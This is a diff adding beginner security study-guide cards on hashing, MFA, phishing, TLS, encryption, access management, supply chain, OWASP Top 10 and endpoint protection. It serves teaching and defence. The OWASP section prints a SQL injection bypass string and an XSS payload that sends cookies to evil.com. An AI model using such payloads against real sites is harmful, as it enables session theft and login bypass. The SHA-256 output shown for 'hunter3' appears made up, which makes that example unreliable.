@@ -1248,4 +1248,470 @@ TLS_CHACHA20_POLY1305_SHA256   <span class="com"># for devices without hardware 
 <div class="topic"><div class="topic-header"><span class="topic-icon">🧒</span><span class="topic-name">Security Basics in Plain English</span><span class="topic-badge">Sec+ • Start Here</span><span class="topic-chevron">&rsaquo;</span></div><div class="topic-body"><div class="concept-card"><div class="concept-label">BIG IDEA</div><div class="concept-title">The CIA Triad (No Spies Involved)</div><div class="concept-desc">Security protects three things. Confidentiality = only the right people can see it (a sealed letter). Integrity = nobody changed it secretly (a tamper seal). Availability = it's there when you need it (the door is unlocked for you). Almost every security idea protects one of these three.</div></div><div class="concept-card"><div class="concept-label">ANALOGY</div><div class="concept-title">Authentication vs. Authorization</div><div class="concept-desc">Authentication proves who you are (showing your ID at the door). Authorization decides what you're allowed to do once inside (your key only opens certain rooms). You authenticate first, then you're authorized.</div></div><div class="concept-card"><div class="concept-label">ANALOGY</div><div class="concept-title">Encryption = a Locked Box</div><div class="concept-desc">Encryption scrambles data so only someone with the key can read it. Picture putting a note in a locked box: anyone can carry the box, but only the key-holder can open it. That's why 'https' sites are safer.</div></div><div class="concept-card"><div class="concept-label">HABIT</div><div class="concept-title">Passwords → Passphrases + MFA</div><div class="concept-desc">Long beats complicated: 'correct-horse-battery-staple' is stronger and easier than 'P@ss1'. Multi-factor authentication (MFA) adds a second proof (a code on your phone) so a stolen password alone isn't enough.</div></div><div class="concept-card"><div class="concept-label">MINDSET</div><div class="concept-title">Least Privilege</div><div class="concept-desc">Give people (and programs) only the access they truly need — nothing extra. The new intern doesn't get the master key. Less access means less damage if an account is ever stolen.</div></div><div class="concept-card"><div class="concept-label">STREET-SMART</div><div class="concept-title">Spotting Phishing</div><div class="concept-desc">Phishing is a fake message that tricks you into clicking or typing a password. Red flags: urgency ('act now!'), odd sender addresses, surprise links, and requests for credentials. When unsure, don't click — verify through a channel you trust.</div></div><table class="ai-table"><thead><tr><th>You Hear…</th><th>It Really Means…</th></tr></thead><tbody><tr><td>Vulnerability</td><td>A weakness (an unlocked window)</td></tr><tr><td>Threat</td><td>Something that could exploit it (a burglar)</td></tr><tr><td>Risk</td><td>The chance it actually hurts you (likelihood × impact)</td></tr><tr><td>Zero Trust</td><td>Verify everyone every time — assume nothing is safe by default</td></tr><tr><td>Hardening</td><td>Closing doors you don't use to shrink the target</td></tr></tbody></table></div></div>
 <!-- BEGINNER2-SEC v1 -->
 <div class="topic"><div class="topic-header"><span class="topic-icon">🧱</span><span class="topic-name">Everyday Security Hygiene</span><span class="topic-badge">Sec+ • Start Here</span><span class="topic-chevron">&rsaquo;</span></div><div class="topic-body"><div class="concept-card"><div class="concept-label">DO THESE</div><div class="concept-title">The Habits That Stop Most Attacks</div><div class="concept-desc">You don’t need to be an expert to be safe. A handful of boring habits blocks the vast majority of real-world attacks — the digital equivalent of washing your hands and locking your door.</div></div><div class="concept-card"><div class="concept-label">BACKUPS</div><div class="concept-title">The 3-2-1 Rule</div><div class="concept-desc">Keep 3 copies of anything important, on 2 different kinds of storage, with 1 copy kept offsite/offline. Then a lost laptop, a crashed drive, or ransomware becomes an annoyance instead of a disaster — if you’ve tested that the restore actually works.</div></div><div class="concept-card"><div class="concept-label">PASSWORDS</div><div class="concept-title">Use a Manager + MFA</div><div class="concept-desc">Humans can’t remember 100 strong, unique passwords — so don’t. A password manager remembers them for you; you remember one good master passphrase. Turn on multi-factor authentication everywhere it’s offered.</div></div><table class="ai-table"><thead><tr><th>Habit</th><th>Why It Helps</th></tr></thead><tbody><tr><td>Install updates promptly</td><td>Patches close known holes attackers use</td></tr><tr><td>Password manager</td><td>Unique strong passwords without memorizing</td></tr><tr><td>Enable MFA</td><td>A stolen password alone won’t get in</td></tr><tr><td>Think before you click</td><td>Stops most phishing cold</td></tr><tr><td>Lock your screen</td><td>30 seconds away ≠ open to anyone walking by</td></tr><tr><td>Back up (3-2-1)</td><td>Turns disasters into inconveniences</td></tr></tbody></table></div></div>
+
+<!-- BEGINNER6-SEC v1 -->
+<!-- ── TOPIC: PASSWORDS & HASHING ────────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🔑</span>
+    <span class="topic-name">Passwords &amp; Hashing — How Logins Are Stored Safely</span>
+    <span class="topic-badge">SEC • Start Here</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">NEVER STORE PLAINTEXT</div>
+      <div class="concept-title">The Golden Rule of Password Storage</div>
+      <div class="concept-desc">Databases get breached. If passwords are stored as-is, every user's password is exposed instantly. Instead, store a <strong>hash</strong> — a one-way transformation that cannot be reversed. When a user logs in, hash what they typed and compare hashes.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">WHAT IS A HASH</div>
+      <div class="concept-title">One-Way Fingerprint</div>
+      <div class="concept-desc">A hash function takes any input and produces a fixed-length output. Same input ALWAYS produces same output. Even one character change completely changes the hash (avalanche effect). You cannot go from hash → original (one-way).</div>
+      <div class="code-block"><span class="kw">import</span> hashlib
+
+text = <span class="str">"hunter2"</span>
+h = hashlib.sha256(text.encode()).hexdigest()
+<span class="com"># f52fbd32b2b3b86ff88ef6c490628285f482af15ddcb29541f94bcf526a3f6c7</span>
+
+text2 = <span class="str">"hunter3"</span>   <span class="com"># one char different</span>
+h2 = hashlib.sha256(text2.encode()).hexdigest()
+<span class="com"># 7a20f6f8c04b1a590a39c74b4f6b3c4a8e6a7f1c2d3e4f5a6b7c8d9e0f1a2b3</span>
+<span class="com"># Completely different — avalanche effect</span></div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">SALTING</div>
+      <div class="concept-title">Why Two Users With Same Password Need Different Hashes</div>
+      <div class="concept-desc">Without salts, two users with "password123" produce the same hash — attackers can pre-compute tables (rainbow tables) and look up hashes instantly. A <strong>salt</strong> is a random value added to the password before hashing. Every user gets a unique salt. Rainbow tables become useless.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">RIGHT TOOLS FOR PASSWORDS</div>
+      <div class="concept-title">Use bcrypt, scrypt, or Argon2</div>
+      <div class="concept-desc">SHA-256 is fast — that's GOOD for verifying file integrity, BAD for passwords (attackers can try billions/sec). <strong>bcrypt</strong>, <strong>scrypt</strong>, and <strong>Argon2</strong> are deliberately slow and memory-hard. They automatically handle salting. Never hand-roll password hashing.</div>
+      <div class="code-block"><span class="com"># pip install bcrypt</span>
+<span class="kw">import</span> bcrypt
+
+<span class="com"># Hash when user registers</span>
+password = <span class="str">"my_secure_pass"</span>
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+
+<span class="com"># Verify on login</span>
+entered = <span class="str">"my_secure_pass"</span>
+<span class="kw">if</span> bcrypt.checkpw(entered.encode(), hashed):
+    <span class="fn">print</span>(<span class="str">"Login OK"</span>)</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">STRONG PASSWORDS</div>
+      <div class="concept-title">Length Beats Complexity</div>
+      <div class="concept-desc">A 20-character random passphrase is stronger than "P@$$w0rd!" — and much easier to remember. Use a <strong>password manager</strong> (Bitwarden, 1Password, KeePass). Generate unique passwords for every site. Enable MFA everywhere possible.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── TOPIC: MFA & AUTHENTICATION METHODS ──────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">📲</span>
+    <span class="topic-name">Multi-Factor Authentication — Layers of Proof</span>
+    <span class="topic-badge">SEC • Foundation</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">THREE FACTORS</div>
+      <div class="concept-title">Something You Know, Have, or Are</div>
+      <div class="concept-desc"><strong>Knowledge factor</strong> — something you know: password, PIN, security questions (weakest).<br>
+      <strong>Possession factor</strong> — something you have: phone (SMS code, authenticator app), hardware token (YubiKey), smart card.<br>
+      <strong>Inherence factor</strong> — something you are: fingerprint, face, iris, voice.<br>
+      MFA requires 2 or more different factor types. Two passwords is NOT MFA.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">MFA METHODS RANKED</div>
+      <div class="concept-title">From Weakest to Strongest</div>
+      <table class="ai-table">
+        <thead><tr><th>Method</th><th>Phish-resistant?</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td>SMS / email OTP</td><td>No</td><td>Vulnerable to SIM swap, SS7 attacks; better than nothing</td></tr>
+          <tr><td>TOTP app (Google Auth, Authy)</td><td>Partial</td><td>Time-based 6-digit codes; can be phished in real-time</td></tr>
+          <tr><td>Push notification</td><td>No</td><td>MFA fatigue attacks — user approves out of habit</td></tr>
+          <tr><td>Hardware token (FIDO2/WebAuthn)</td><td>Yes</td><td>Cryptographically bound to domain; gold standard</td></tr>
+          <tr><td>Passkeys</td><td>Yes</td><td>FIDO2 using device biometrics; replacing passwords</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">HOW TOTP WORKS</div>
+      <div class="concept-title">Time-Based One-Time Passwords</div>
+      <div class="concept-desc">During setup, the server shares a secret key with your phone (usually via QR code). Every 30 seconds, both your phone AND the server compute HMAC-SHA1(secret + current_time_window). They should match. An attacker needs the secret AND the current window — that's why TOTP codes expire so fast.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── TOPIC: PHISHING ANATOMY ────────────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🎣</span>
+    <span class="topic-name">Phishing — Anatomy of a Social Engineering Attack</span>
+    <span class="topic-badge">SEC • Threat Awareness</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">WHAT IS PHISHING</div>
+      <div class="concept-title">Deception, Not Hacking</div>
+      <div class="concept-desc">Phishing attacks trick people into giving up credentials, installing malware, or sending money. They exploit <strong>psychology</strong>, not software vulnerabilities. No patch exists for human instinct. The name comes from "fishing" — casting bait and waiting for a bite.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">ATTACK VARIETIES</div>
+      <div class="concept-title">Phishing, Spear, Whaling, Vishing, Smishing</div>
+      <div class="concept-desc"><strong>Phishing</strong> — mass emails, generic "Dear Customer" bait.<br>
+      <strong>Spear phishing</strong> — targeted at a specific person using research (LinkedIn, social media). High success rate.<br>
+      <strong>Whaling</strong> — targets C-suite executives. Higher payoff.<br>
+      <strong>Vishing</strong> — voice phishing by phone. "This is Microsoft Support…"<br>
+      <strong>Smishing</strong> — SMS phishing. "Your package is stuck, click here."<br>
+      <strong>Business Email Compromise (BEC)</strong> — impersonates a CEO to trick finance into a wire transfer.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">RED FLAGS</div>
+      <div class="concept-title">How to Spot a Phishing Attempt</div>
+      <div class="concept-desc">• Urgency or fear: "Your account will be suspended in 24 hours!"<br>
+      • Mismatched URLs: display text says google.com, actual link is g00gle.evil.com<br>
+      • Unexpected attachment — especially .exe, .docm, .zip files<br>
+      • Slightly wrong sender address: support@amaz0n.com vs amazon.com<br>
+      • Grammar errors (though AI-generated phishing now has perfect grammar)<br>
+      • Requests for credentials, wire transfers, or gift cards via email<br>
+      • Too-good-to-be-true offers</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">DEFENSE</div>
+      <div class="concept-title">What Actually Stops Phishing</div>
+      <div class="concept-desc"><strong>Technical</strong>: email filtering (spam/malware), DMARC/SPF/DKIM to prevent spoofing, URL rewriting, MFA (even if credentials are stolen, attacker can't log in).<br>
+      <strong>Human</strong>: regular security awareness training with simulated phishing campaigns. People need to fail safely in training, not in real attacks.<br>
+      <strong>Process</strong>: out-of-band verification (call the CEO on a known number before wiring $500k).</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- BEGINNER9-SEC v1 -->
+<!-- ── TOPIC: TLS/HTTPS HOW IT WORKS ─────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🔒</span>
+    <span class="topic-name">TLS &amp; HTTPS — How Secure Connections Work</span>
+    <span class="topic-badge">SEC • Foundation</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">THE PROBLEM</div>
+      <div class="concept-title">HTTP Is Plaintext — Anyone Can Read It</div>
+      <div class="concept-desc">When you send a form over HTTP, the data travels through multiple hops (your router, ISP, CDN, etc.) as readable text. Anyone on those hops can see your password, credit card, messages. TLS (Transport Layer Security) encrypts the connection so even if someone intercepts the traffic, all they see is gibberish.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">TLS HANDSHAKE</div>
+      <div class="concept-title">Establish Trust + Exchange Keys</div>
+      <div class="concept-desc">1. Client → Server: "Hello. I support these cipher suites and TLS versions."<br>
+      2. Server → Client: "Hello. Here's my certificate. We'll use cipher X."<br>
+      3. Client: Verify certificate against trusted CA list.<br>
+      4. Key exchange (ECDHE): Both sides derive the same symmetric session key without ever transmitting it (Diffie-Hellman magic).<br>
+      5. All further communication encrypted with that session key.<br>
+      The asymmetric crypto (certificates) is only used during handshake. The bulk encryption uses faster symmetric crypto.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">CERTIFICATES</div>
+      <div class="concept-title">Digital Identity Documents</div>
+      <div class="concept-desc">A TLS certificate binds a domain name to a public key, signed by a Certificate Authority (CA) the browser trusts. The chain of trust:<br>
+      <strong>Root CA</strong> → (built into OS/browser)<br>
+      <strong>Intermediate CA</strong> → (issued by root)<br>
+      <strong>End-entity cert</strong> → (your server's cert)<br>
+      If you trust the root, and the root signed the intermediate, and the intermediate signed your cert, you trust your cert.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">CERT VALIDATION LEVELS</div>
+      <div class="concept-title">DV vs OV vs EV</div>
+      <div class="concept-desc"><strong>Domain Validated (DV)</strong> — CA just verifies you control the domain. Free (Let's Encrypt). Shows padlock in browser. Good for most sites.<br>
+      <strong>Organization Validated (OV)</strong> — CA verifies organization identity. More trust signal for businesses.<br>
+      <strong>Extended Validation (EV)</strong> — rigorous identity check. Historically showed green bar with company name (most browsers dropped this UI).</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">COMMON CERT ISSUES</div>
+      <div class="concept-title">Errors You'll See and What They Mean</div>
+      <table class="ai-table">
+        <thead><tr><th>Error</th><th>Cause</th><th>Fix</th></tr></thead>
+        <tbody>
+          <tr><td>Certificate expired</td><td>cert past validity date</td><td>Renew/replace cert (Let's Encrypt auto-renews)</td></tr>
+          <tr><td>Name mismatch</td><td>cert for example.com used on sub.example.com</td><td>Use wildcard cert or include SANs</td></tr>
+          <tr><td>Untrusted CA</td><td>self-signed or private CA</td><td>Install CA cert in trust store or buy a public cert</td></tr>
+          <tr><td>Incomplete chain</td><td>missing intermediate cert</td><td>Include full chain in server config</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">LET'S ENCRYPT</div>
+      <div class="concept-title">Free, Automated, Trusted Certificates</div>
+      <div class="concept-desc">Let's Encrypt is a free, automated CA. Use the <code>certbot</code> tool to get and auto-renew certificates with zero cost. It changed the web — HTTPS adoption went from ~40% in 2015 to ~95%+ today, largely because Let's Encrypt eliminated the cost barrier.</div>
+      <div class="code-block"><span class="com"># Install certbot (Debian/Ubuntu)</span>
+sudo apt install certbot python3-certbot-nginx
+
+<span class="com"># Get cert and auto-configure nginx</span>
+sudo certbot --nginx -d example.com -d www.example.com
+
+<span class="com"># Test auto-renewal</span>
+sudo certbot renew --dry-run</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── TOPIC: ENCRYPTION FUNDAMENTALS ────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🔐</span>
+    <span class="topic-name">Encryption Fundamentals — Symmetric vs Asymmetric</span>
+    <span class="topic-badge">SEC • Foundation</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">SYMMETRIC ENCRYPTION</div>
+      <div class="concept-title">Same Key to Lock and Unlock</div>
+      <div class="concept-desc">One key encrypts AND decrypts. Fast, efficient for large data. Problem: key distribution — how do you securely share the key with the other party? Best algorithms: AES-256 (gold standard), ChaCha20. Used for: encrypting data at rest, bulk data transfer after handshake.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">ASYMMETRIC ENCRYPTION</div>
+      <div class="concept-title">Public Key + Private Key</div>
+      <div class="concept-desc">Two mathematically linked keys. Public key encrypts (share freely — give to everyone). Private key decrypts (keep secret). Solves key distribution: encrypt with their public key → only they can decrypt with their private key. Slower than symmetric. Best algorithms: RSA-2048+, ECC (smaller keys, same strength). Used for: TLS handshake, SSH auth, digital signatures.</div>
+    </div>
+    <table class="ai-table">
+      <thead><tr><th>Property</th><th>Symmetric</th><th>Asymmetric</th></tr></thead>
+      <tbody>
+        <tr><td>Keys</td><td>1 shared key</td><td>Key pair (public + private)</td></tr>
+        <tr><td>Speed</td><td>Very fast</td><td>Slow (100-1000× slower)</td></tr>
+        <tr><td>Key distribution</td><td>Hard (secure channel needed)</td><td>Easy (public key is public)</td></tr>
+        <tr><td>Best for</td><td>Bulk data encryption</td><td>Key exchange, signatures</td></tr>
+        <tr><td>Example</td><td>AES-256</td><td>RSA, ECC</td></tr>
+        <tr><td>Used in TLS</td><td>Session data (after handshake)</td><td>Handshake / key exchange</td></tr>
+      </tbody>
+    </table>
+    <div class="concept-card">
+      <div class="concept-label">DIGITAL SIGNATURES</div>
+      <div class="concept-title">Prove It Came From You and Wasn't Changed</div>
+      <div class="concept-desc"><strong>Signing</strong>: hash the document, encrypt the hash with your PRIVATE key → signature.<br>
+      <strong>Verifying</strong>: decrypt signature with sender's PUBLIC key → get hash. Hash the document yourself. If hashes match → not tampered, signed by private key holder.<br>
+      Used in: software distribution (code signing), email (S/MIME, PGP), TLS certificates, git commits, JWT tokens.</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- BEGINNER10-SEC v1 -->
+<!-- ── TOPIC: IDENTITY & ACCESS MANAGEMENT ───────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🪪</span>
+    <span class="topic-name">Identity &amp; Access Management — Who Can Do What</span>
+    <span class="topic-badge">SEC • Foundation</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">THE CORE PROBLEM</div>
+      <div class="concept-title">Authentication vs Authorization</div>
+      <div class="concept-desc"><strong>Authentication (AuthN)</strong> — proving who you are. "I am Alice." Verified by password, biometric, token, or certificate.<br>
+      <strong>Authorization (AuthZ)</strong> — what you're allowed to do. "Alice can read reports but not delete records." Enforced by permissions, roles, policies.<br>
+      These are separate concerns. Getting them confused causes security holes (assuming that anyone logged in can do anything).</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">PRINCIPLE OF LEAST PRIVILEGE</div>
+      <div class="concept-title">Give Only What's Needed</div>
+      <div class="concept-desc">Every user, service, and process should have the minimum permissions needed to do its job — and nothing more. An analytics service that reads data shouldn't have write permissions. A developer account shouldn't have production database access by default. When something is compromised, least privilege contains the blast radius.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">RBAC vs ABAC</div>
+      <div class="concept-title">Role-Based vs Attribute-Based Access Control</div>
+      <div class="concept-desc"><strong>RBAC (Role-Based)</strong> — assign roles to users; permissions attached to roles. Simple to manage at scale. "Alice is an Admin; Admins can do X, Y, Z." Standard in most systems.<br>
+      <strong>ABAC (Attribute-Based)</strong> — permissions based on attributes of user, resource, environment. "Allow if user.department = finance AND resource.sensitivity = confidential AND time = business_hours." More flexible, harder to audit.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">SSO & FEDERATION</div>
+      <div class="concept-title">One Login, Many Systems</div>
+      <div class="concept-desc"><strong>SSO (Single Sign-On)</strong> — log in once, access many applications. Used with SAML 2.0 or OIDC (OAuth 2.0 extension). Benefits: one password to manage, one place to revoke access when someone leaves.<br>
+      <strong>OIDC/OAuth 2.0</strong> — modern standard for federated identity. "Login with Google" is OIDC. Google proves your identity to the app without giving the app your password.<br>
+      <strong>SAML 2.0</strong> — XML-based, enterprise standard. Used for enterprise SSO (Okta, Azure AD, Ping).</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">ZERO TRUST</div>
+      <div class="concept-title">Never Trust, Always Verify</div>
+      <div class="concept-desc">Traditional security assumed: inside the network = trusted; outside = untrusted. Zero trust assumes breach and verifies every request regardless of source — even from inside the corporate network.<br>
+      Principles:<br>
+      • Verify explicitly — authenticate and authorize every request, every time<br>
+      • Least privilege — minimal access, time-limited<br>
+      • Assume breach — design as if attackers are already inside</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── TOPIC: SUPPLY CHAIN SECURITY ──────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">⛓️</span>
+    <span class="topic-name">Supply Chain Security — Trust What You Build With</span>
+    <span class="topic-badge">SEC • Advanced Awareness</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">WHAT IS SUPPLY CHAIN SECURITY</div>
+      <div class="concept-title">Attackers Go for the Builder, Not the Building</div>
+      <div class="concept-desc">Modern apps depend on thousands of open-source packages. Attackers compromise <strong>upstream</strong> — a popular library, build tool, or CI/CD pipeline — and then automatically infect everything downstream that uses it. The SolarWinds breach (2020) infected 18,000 organizations via a compromised software update. The XZ Utils backdoor (2024) nearly compromised SSH servers worldwide.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">SBOM</div>
+      <div class="concept-title">Software Bill of Materials</div>
+      <div class="concept-desc">An SBOM is an inventory of every component in your software — all dependencies, their versions, and their licenses. Like an ingredients list for your app. When a critical vulnerability (Log4Shell, Heartbleed) drops, you can instantly check if you're affected by scanning your SBOM. Now required for software sold to US federal agencies.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">DEPENDENCY HYGIENE</div>
+      <div class="concept-title">Practical Steps to Reduce Risk</div>
+      <div class="concept-desc">• <strong>Pin versions</strong>: use <code>requests==2.31.0</code> not <code>requests&gt;=2</code>. Unpinned deps silently update and break.<br>
+      • <strong>Verify hashes</strong>: <code>pip install --require-hashes</code> validates that downloaded packages match expected hashes.<br>
+      • <strong>Use Dependabot or Renovate</strong>: automated PRs when dependencies have security updates.<br>
+      • <strong>Audit regularly</strong>: <code>pip audit</code>, <code>npm audit</code>, <code>cargo audit</code> scan for known vulnerabilities.<br>
+      • <strong>Don't install unknown packages</strong>: "typosquatting" packages (requestts, colors2) exist to compromise you.</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- BEGINNER12-SEC v1 -->
+<!-- ── TOPIC: OWASP TOP 10 WEB VULNERABILITIES ───────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">🕸️</span>
+    <span class="topic-name">OWASP Top 10 — The Most Critical Web Security Risks</span>
+    <span class="topic-badge">SEC • Essential</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">WHAT IS OWASP</div>
+      <div class="concept-title">Open Web Application Security Project</div>
+      <div class="concept-desc">OWASP is a nonprofit foundation that publishes the Top 10 — a consensus list of the most critical web application security risks, updated every few years based on real-world data. Every web developer and security professional should know these by heart.</div>
+    </div>
+    <table class="ai-table">
+      <thead><tr><th>#</th><th>Risk</th><th>Example Attack</th><th>Prevention</th></tr></thead>
+      <tbody>
+        <tr><td>A01</td><td>Broken Access Control</td><td>Changing URL param to access another user's data</td><td>Enforce authorization server-side for every request</td></tr>
+        <tr><td>A02</td><td>Cryptographic Failures</td><td>HTTP instead of HTTPS; MD5 password hashes</td><td>TLS everywhere; bcrypt for passwords; AES-256 for data</td></tr>
+        <tr><td>A03</td><td>Injection (SQLi, XSS, etc.)</td><td><code>' OR '1'='1</code> in login field</td><td>Parameterized queries; input validation; output encoding</td></tr>
+        <tr><td>A04</td><td>Insecure Design</td><td>No rate limiting; predictable reset tokens</td><td>Threat modeling; security requirements from day 1</td></tr>
+        <tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds; debug mode in prod; open S3 buckets</td><td>Hardening guides; IaC with security checks; scan configs</td></tr>
+        <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell; Heartbleed; npm package with malware</td><td>Inventory dependencies; Dependabot; SCA scanning</td></tr>
+        <tr><td>A07</td><td>Auth Failures</td><td>Brute force; credential stuffing; weak passwords</td><td>MFA; account lockout; breached password checks</td></tr>
+        <tr><td>A08</td><td>Software Integrity Failures</td><td>CI/CD pipeline compromise; insecure deserialization</td><td>Code signing; trusted registries; verify checksums</td></tr>
+        <tr><td>A09</td><td>Logging &amp; Monitoring Failures</td><td>Attack goes undetected for months</td><td>Centralized logging; SIEM alerts; test detection</td></tr>
+        <tr><td>A10</td><td>SSRF</td><td>User-supplied URL fetched by server → internal services exposed</td><td>Allowlist URLs; block RFC-1918 addresses</td></tr>
+      </tbody>
+    </table>
+    <div class="concept-card">
+      <div class="concept-label">SQL INJECTION DEEP DIVE</div>
+      <div class="concept-title">The Most Classic Vulnerability</div>
+      <div class="concept-desc">SQL injection lets an attacker insert SQL commands into a query. If a login form does:</div>
+      <div class="code-block"><span class="com"># VULNERABLE — NEVER DO THIS</span>
+query = <span class="str">f"SELECT * FROM users WHERE name='{username}' AND password='{password}'"</span>
+
+<span class="com"># If username = "' OR '1'='1'; -- "</span>
+<span class="com"># Query becomes: SELECT * FROM users WHERE name='' OR '1'='1'; --'</span>
+<span class="com"># The -- comments out rest; '1'='1' is always true → login without password!</span>
+
+<span class="com"># CORRECT — Parameterized query (Python sqlite3)</span>
+cursor.execute(<span class="str">"SELECT * FROM users WHERE name=? AND password=?"</span>,
+               (username, password_hash))
+<span class="com"># Parameters are treated as DATA, never as SQL code</span></div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">XSS</div>
+      <div class="concept-title">Cross-Site Scripting — Injecting JavaScript</div>
+      <div class="concept-desc">XSS lets attackers inject malicious JavaScript into web pages that other users see. If you display unsanitized user input in HTML, an attacker submits <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code> and steals every visitor's session cookie.<br>
+      <strong>Prevention</strong>: always HTML-encode output. In Python Jinja2: <code>{{ user_input }}</code> auto-escapes. Never use <code>{{ user_input|safe }}</code> unless you're absolutely sure it's clean. Use Content Security Policy (CSP) headers.</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- BEGINNER15-SEC v1 -->
+<!-- ── TOPIC: ENDPOINT SECURITY ──────────────────────────── -->
+<div class="topic">
+  <div class="topic-header">
+    <span class="topic-icon">💻</span>
+    <span class="topic-name">Endpoint Security — Protecting the Devices People Actually Use</span>
+    <span class="topic-badge">SEC • Essential</span>
+    <span class="topic-chevron">›</span>
+  </div>
+  <div class="topic-body">
+    <div class="concept-card">
+      <div class="concept-label">WHY ENDPOINTS MATTER</div>
+      <div class="concept-title">The Endpoint Is the New Perimeter</div>
+      <div class="concept-desc">The old security model was a hard perimeter (firewall) around a soft inside. But with remote work, cloud, and mobile, there is no perimeter — laptops connect from coffee shops, phones access company email. The endpoint (any device: laptop, phone, server, IoT) is now where attacks land. Most breaches start with a compromised endpoint: a clicked phishing link, a malicious download, a stolen laptop.</div>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">AV → EDR → XDR</div>
+      <div class="concept-title">The Evolution of Endpoint Protection</div>
+      <table class="ai-table">
+        <thead><tr><th>Generation</th><th>Full Name</th><th>How It Works</th><th>Limitation</th></tr></thead>
+        <tbody>
+          <tr><td>AV</td><td>Antivirus</td><td>Signature-based — matches known malware fingerprints</td><td>Can't catch new/unknown (zero-day) malware</td></tr>
+          <tr><td>NGAV</td><td>Next-Gen Antivirus</td><td>Adds behavioral analysis, ML, heuristics</td><td>Still focused on prevention, limited investigation</td></tr>
+          <tr><td>EDR</td><td>Endpoint Detection &amp; Response</td><td>Records endpoint activity, detects suspicious behavior, enables investigation + response</td><td>Endpoint-only visibility</td></tr>
+          <tr><td>XDR</td><td>Extended Detection &amp; Response</td><td>Correlates across endpoint, network, email, cloud, identity</td><td>Complexity, cost, vendor lock-in</td></tr>
+          <tr><td>MDR</td><td>Managed Detection &amp; Response</td><td>EDR/XDR + a human SOC team running it for you</td><td>Outsourced — less direct control</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">EDR CAPABILITIES</div>
+      <div class="concept-title">What EDR Actually Does</div>
+      <table class="ai-table">
+        <thead><tr><th>Capability</th><th>What It Means</th></tr></thead>
+        <tbody>
+          <tr><td>Continuous recording</td><td>Logs process launches, file changes, network connections, registry edits — like a flight recorder</td></tr>
+          <tr><td>Behavioral detection</td><td>Flags suspicious sequences (Word spawns PowerShell spawns cmd = likely malicious)</td></tr>
+          <tr><td>Threat hunting</td><td>Lets analysts query historical data: "show every host that ran certutil last week"</td></tr>
+          <tr><td>Isolation</td><td>Remotely quarantine a compromised host from the network (but keep EDR connection)</td></tr>
+          <tr><td>Remediation</td><td>Kill processes, delete files, roll back changes remotely</td></tr>
+          <tr><td>Root cause analysis</td><td>Reconstruct the full attack chain from initial access to impact</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">ENDPOINT HARDENING</div>
+      <div class="concept-title">Reduce the Attack Surface Before Anything Lands</div>
+      <table class="ai-table">
+        <thead><tr><th>Control</th><th>Why It Helps</th></tr></thead>
+        <tbody>
+          <tr><td>Disk encryption (BitLocker/FileVault/LUKS)</td><td>Stolen laptop = no data exposure</td></tr>
